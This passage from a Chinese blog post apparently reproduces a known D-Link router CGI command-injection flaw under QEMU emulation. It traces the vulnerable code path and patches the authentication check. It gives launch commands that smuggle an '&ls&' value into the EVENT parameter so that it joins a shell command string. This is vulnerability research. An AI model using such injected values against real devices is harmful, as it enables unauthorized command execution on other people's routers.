data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221145.png" alt="image-20210209221145009"></p><p>当解析无误后返回上层函数，然后进入权限认证：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221306.png" alt="image-20210209221306768"></p><p>在这个认证函数内部的函数 <code>sess_get_uid</code> ，可以看到是从 HTTP_COOKIE 里面获取 uid 判断：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221716.png" alt="image-20210209221716723"></p><p>进入 <code> sub_40A950</code> 将 URL ？ 后面部分与关键词匹配，如果一致就开始准备进入拼接命令字符串：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222749.png" alt="image-20210209222749033"></p><p><code>lxmldbc_system</code> 里面将预制指令和 URL 里面参数进行拼接：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222937.png" alt="image-20210209222937398"></p><p>Event 命令字符串为：<code>&quot;event %s &gt; /dev/null&quot;</code> ，中间我们可以加上任意指令比如：<code>&quot;event &amp;ls&amp; &gt; /dev/null&quot;</code></p><p>开始测试前，权限认证那里由于少文件等，要将那个函数 patch 改一下。把跳转 session 改掉不然会卡一段时间，因为仿真没有 <code>/var/session</code> 文件；v1 的复制改为 1 就是代表有权限：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232026.png" alt="image-20210209232026784"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231657.png" alt="image-20210209231657216"></p><p>测试一下，启动命令：</p><blockquote><p>-0：传入第一个参数，进入 servicecgi_main</p><p>-E：选项传入自定义的环境变量</p><p>-strace：显示具体信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p>启动后，报错解析不了：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209230233.png" alt="image-20210209230233246"></p><p>加上调试解析函数看都是解析正确，单步调试就发现是成功解析后执行 retrun 函数并没有返回到上一层，而是继续往下执行 95 行的 retrun v9 这是的 v9 为 -1 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231306.png" alt="image-20210209231306395"></p><p>cataLpa 师傅复现文章也出现相同情况，推测可能是 qemu 仿真问题。这里可以直接改寄存器或者 patch 一下。</p><p>再次启动，这次就正常回显，但是没有运行附加进去的指令：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232205.png" alt="image-20210209232205679"></p><p>附加上 <code>-strace</code> 查看一下详细信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel -g 1234 -strace \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209233118.png" alt="image-20210209233118432"></p><p>指令已经附加上去，应该是 qemu 环境问题运行不了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/">https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dlink </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
